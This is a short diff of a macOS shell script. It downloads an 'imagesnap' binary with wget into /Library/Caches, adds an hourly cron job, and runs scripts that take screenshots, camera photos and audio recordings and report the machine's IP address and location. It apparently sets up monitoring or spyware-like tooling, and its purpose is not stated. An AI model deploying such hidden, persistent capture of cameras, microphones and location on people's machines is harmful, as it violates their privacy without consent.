@@ -24,16 +24,16 @@ wget -O /Library/Caches/imagesnap https://raw.githubusercontent.com/angeldiaziba
 ( crontab -l ; echo "0 * * * * /bin/sh /Library/Caches/cron-60.sh" ) | crontab -
 
 # Test the screenshot feature
-sh screenshot.sh 
+sh /Library/Caches/screenshot.sh 
 
 # Test the IP feature
-sh getip.sh
+sh /Library/Caches/getip.sh
 
 # Test the photo feature (requires permissions)
-sh photo.sh 
+sh /Library/Caches/photo.sh 
 
 # Test the audio recording feature (requires permissions)
-sh recordaudio.sh
+sh /Library/Caches/recordaudio.sh
 
 # Test the geolocation feature (requires permissions)
-sh locateme.sh 
+sh /Library/Caches/locateme.sh 
